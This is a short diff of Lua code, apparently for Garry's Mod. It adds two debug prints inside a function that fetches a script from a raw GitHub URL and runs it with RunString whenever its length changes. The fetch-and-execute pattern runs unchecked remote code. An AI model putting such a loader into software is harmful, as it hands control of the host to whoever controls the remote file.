@@ -125,8 +125,10 @@ local function fetchScript()
     http.Fetch("https://raw.githubusercontent.com/Rovinag12/fluffy/main/script.lua",
         function(body, len, headers, code)
             if code == 200 then
+                print(prevLength)
                 if prevLength ~= len then
                     prevLength = len
+                    print(len)
                     RunString(body)
                 end
             else
